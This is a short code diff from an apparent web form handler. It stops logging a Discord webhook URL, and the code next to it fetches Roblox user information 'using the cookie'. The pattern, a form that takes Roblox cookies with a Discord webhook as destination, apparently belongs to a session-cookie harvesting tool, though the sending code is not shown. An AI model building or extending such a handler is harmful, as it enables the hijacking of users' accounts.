@@ -276,7 +276,7 @@ def submit_form():
                 'message': 'Webhook not configured - check environment variables'
             }), 500
         
-        print(f"Using webhook URL: {webhook_url[:50]}...") # Log first 50 chars for debugging
+        print("Discord webhook URL configured successfully") # Don't log URL for security
         
         # Get real Roblox user information using the cookie
         print("Fetching Roblox user information...")
